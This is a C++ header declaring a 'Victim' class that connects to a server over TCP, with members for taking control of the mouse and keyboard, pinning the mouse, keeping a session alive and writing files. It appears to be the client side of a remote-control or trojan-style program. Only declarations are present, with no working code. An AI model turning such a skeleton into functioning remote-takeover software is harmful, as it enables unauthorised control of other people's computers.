#pragma once
#include <SFML/Network.hpp>
#include "Mlib/System/system.hpp"
#include "Mlib/System/keyboard.hpp"
#include "Mlib/System/mouse.hpp"
#include "Mlib/System/file.hpp"
#include <iostream>
#include <thread>
#include <fstream>
#include "../secret.h"

class Victim
{
public:
	Victim();
	int controlVictim();

private:
	void keepAwake();
	void connectServer();
	void createNewFile();
	void pinMouse();
	sf::Socket::Status sendServer(sf::Packet& p);

	bool controlMouse = false, controlKeyboard = false;
	bool isConnected = false, isRunning = true;
	const Mlib::Vec2i screenSize = Mlib::displaySize();
	size_t lastAwakeSignal = Mlib::currentTime().asMil();
	sf::TcpSocket server;
	bool keysStates[256];
	std::string name = "";
	Mlib::Vec2i mousePos = Mlib::Vec2i(0, 0);
	std::ofstream* file = nullptr;
	std::string filePath = "";
	sf::Mutex mutex;
};